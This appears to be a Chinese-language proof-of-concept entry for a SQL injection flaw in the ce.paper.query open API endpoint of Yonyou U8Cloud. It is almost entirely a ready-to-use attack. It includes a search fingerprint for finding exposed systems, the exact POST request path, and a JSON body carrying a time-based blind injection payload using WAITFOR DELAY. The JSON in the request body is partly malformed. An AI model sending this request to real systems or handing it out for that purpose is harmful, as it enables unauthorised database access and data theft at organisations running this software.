# 用友U8Cloudce.paper.query存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="U8C"`
- **请求**：`POST /u8cloud/openapi/ce.paper.query?appcode=lbsj&isEncrypt=N&trantype=paperexecute HTTP/1.1`

**请求体 / payload**
```
路径：/u8cloud/openapi/ce/paper/query 或者 /u8cloud/openapi/ce.paper.query 均可
Host:
Content-Type: application/json
Content-Length: 108
"paperexecute": [
"pk_group": "1'; WAITFOR DELAY '0:0:5'--",
"pk_paper": "1"
]
POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&isEncrypt=N HTTP/1.1
Host:
Content-Type: application/json
Content-Length: 95
"paperexecute": [
{ "pk_group": "1'; WAITFOR DELAY '0:0:5'--", "pk_paper": "1" }
]
}
```
- **预期**：200　|　—